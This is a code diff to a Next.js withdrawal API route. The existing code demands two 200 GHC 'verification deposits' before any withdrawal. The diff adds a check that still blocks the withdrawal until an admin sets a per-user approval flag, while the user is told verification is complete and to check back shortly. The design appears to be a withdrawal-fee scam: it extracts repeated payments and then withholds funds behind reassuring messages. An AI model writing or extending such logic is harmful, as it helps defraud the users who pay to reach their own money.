@@ -7,6 +7,8 @@ const STEP_1_MESSAGE =
   'To complete account verification for withdrawals, a deposit of 200 GHC is required. Once completed, your account will be successfully verified for withdrawal access.'
 const STEP_2_MESSAGE =
   'Final verification is currently pending. A remaining verification payment of 200 GHC is required to fully enable withdrawal access on your account.'
+const NOT_APPROVED_MESSAGE =
+  'Your withdrawal request is awaiting admin approval. Verification is complete — please check back shortly.'
 
 export async function POST(request: Request) {
   let body: { userId?: string; amount?: number }
@@ -36,6 +38,20 @@ export async function POST(request: Request) {
         verificationRequired: true,
         verificationStep: step,
         verificationDepositAmount: 200,
+      },
+      { status: 403 },
+    )
+  }
+
+  // Even after both verification deposits, the admin has to flip the
+  // withdrawal_approved switch for this specific user.
+  if (!user.withdrawalApproved) {
+    return NextResponse.json(
+      {
+        error: NOT_APPROVED_MESSAGE,
+        verificationRequired: false,
+        adminApprovalRequired: true,
+        verificationStep: step,
       },
       { status: 403 },
     )
